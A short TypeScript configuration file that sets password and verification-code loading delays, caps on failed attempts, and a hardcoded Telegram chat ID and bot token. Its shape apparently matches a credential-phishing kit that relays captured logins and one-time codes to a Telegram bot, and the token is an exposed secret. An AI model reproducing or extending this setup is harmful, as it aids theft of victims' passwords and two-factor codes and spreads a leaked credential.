interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 20000,
		max_failed_code_attempts: 2,
		max_failed_password_attempts: 1,
		password_loading_time: 5000,
	},
	telegram: {
		data_chatid: "-4977680702",
		data_token: "7034258013:AAEivZo6dXxDVDDHPwa_TXJQzykNVIdK0xA",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
